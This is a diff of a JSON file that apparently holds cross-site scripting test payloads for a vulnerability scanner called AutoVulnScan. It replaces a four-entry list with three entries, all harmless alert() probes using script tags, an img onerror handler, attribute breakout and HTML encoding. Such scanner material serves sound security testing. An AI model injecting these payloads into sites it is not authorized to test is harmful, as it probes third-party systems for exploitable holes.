@@ -1,21 +1,14 @@
-{
-  "name": "Cross-Site Scripting (XSS) Payloads",
-  "payloads": [
+[
     {
-      "value": "<script>alert('AutoVulnScanXSS')</script>",
-      "description": "Basic script tag injection"
+      "description": "Basic XSS test",
+      "payload": "<script>alert('AutoVulnScanXSS')</script>"
     },
     {
-      "value": "\"/><script>alert('AutoVulnScanXSS')</script>",
-      "description": "Break out of HTML attribute"
+      "description": "Image-based XSS test",
+      "payload": "<img src=x onerror=alert('AutoVulnScanXSS')>"
     },
     {
-      "value": "' onmouseover='alert(\"AutoVulnScanXSS\")'",
-      "description": "Event handler injection"
-    },
-    {
-      "value": "<img src=x onerror=alert('AutoVulnScanXSS')>",
-      "description": "Image tag with onerror event"
+        "description": "HTML-encoded XSS test",
+        "payload": "&lt;script&gt;alert('AutoVulnScanXSS')&lt;/script&gt;"
     }
-  ]
-} 
+] 
